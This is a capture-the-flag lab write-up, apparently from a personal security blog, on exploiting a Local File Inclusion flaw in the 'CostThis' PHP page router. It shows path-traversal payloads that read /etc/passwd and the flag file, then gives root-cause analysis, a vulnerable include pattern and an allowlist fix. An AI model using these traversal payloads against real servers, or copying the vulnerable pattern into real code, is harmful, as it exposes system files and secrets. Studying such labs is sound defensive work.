---
title: "Local File Inclusion via Template Router | CostThis"
date: 2026-06-09 10:30:00 +0530
categories: [A01 - Broken Access Control, Local File Inclusion]
tags: [lfi, path-traversal, file-disclosure, php, webverselabs-pro, costthis]
author: Shivansh Sharma
image:
    path: /assets/images/posts/costthis-local-file-inclusion.webp
    alt: "CostThis Local File Inclusion"
---

## Lab Link

Lab: [CostThis](https://dashboard.webverselabs-pro.com/mystery-challenges/costthis)

## Overview

CostThis uses a simple page router that dynamically loads content from files stored on disk. The page being rendered is controlled through a URL parameter, making the application susceptible to Local File Inclusion (LFI).

By abusing directory traversal sequences, it was possible to force the application to include arbitrary files from the server filesystem and retrieve the flag.

## Objective

Exploit the page router to read arbitrary files and retrieve the flag.

## Vulnerability Identification

### Classification Hierarchy

```text
A01 - Broken Access Control
└── Path Traversal
    └── Local File Inclusion (LFI)
        └── Arbitrary File Read
```

The application trusted user-controlled file paths and failed to restrict access to files outside the intended template directory.

## Reconnaissance

While browsing the site, the services page used the following URL:

```text
?page=pages/services.php
```

The `page` parameter appeared to determine which file was loaded by the application.

This suggested a potential Local File Inclusion vulnerability.

## Exploitation

The first test attempted to traverse outside the web directory and access `/etc/passwd`.

```text
?page=../../../../../../../etc/passwd
```

The application responded with:

```text
403 Forbidden
```

Although access was denied, the response indicated that the parameter was being processed and the target file path existed.

The next observation was that the application appeared to expect files within the `pages/` directory.

Instead of removing the expected path completely, directory traversal was performed after the existing directory.

```text
?page=pages/../../../../../../../etc/passwd
```

This time the request succeeded.

The contents of `/etc/passwd` were displayed in the response, confirming successful Local File Inclusion.

Example output:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Proof of Exploitation

With arbitrary file reads confirmed, the same technique was used to access the flag file.

```text
?page=pages/../../../../../../../flag.txt
```

Response:

```text
WEBVERSE{REDACTED}
```

The challenge is successfully solved.

## Root Cause Analysis

The page router accepted a user-controlled filename and included it directly without properly validating the resulting path.

Because directory traversal sequences (`../`) were not filtered or normalized securely, attackers could escape the intended template directory and access arbitrary files elsewhere on the filesystem.

The application attempted to load files from the `pages/` directory but failed to enforce that restriction after path resolution.

## Impact

Successful exploitation allows attackers to:

* Read arbitrary files from the server
* Access configuration files
* Expose application source code
* Leak credentials and secrets
* Gather information for further attacks
* Potentially discover additional attack paths

Severity: **High**

## Mitigation

To prevent Local File Inclusion vulnerabilities:

* Use an allowlist of permitted templates
* Avoid loading files directly from user input
* Normalize and validate file paths
* Reject directory traversal sequences
* Restrict file access to predefined directories
* Use indirect identifiers instead of filesystem paths

Vulnerable pattern:

```php
include($_GET['page']);
```

Secure pattern:

```php
$pages = [
    'home' => 'pages/home.php',
    'services' => 'pages/services.php',
    'about' => 'pages/about.php'
];

include($pages[$_GET['page']] ?? 'pages/home.php');
```

## Real-World Insight

Local File Inclusion vulnerabilities frequently occur in applications that dynamically load templates, themes, language packs, or content files based on user input.

Even when developers attempt to constrain file access to a specific directory, improper path validation can allow attackers to escape the intended location using directory traversal sequences. In real-world environments, LFI often leads to source code disclosure, credential exposure, and sometimes Remote Code Execution when combined with log poisoning or file upload vulnerabilities.

CostThis demonstrates how a simple routing shortcut can expose the entire filesystem when user-controlled paths are trusted.
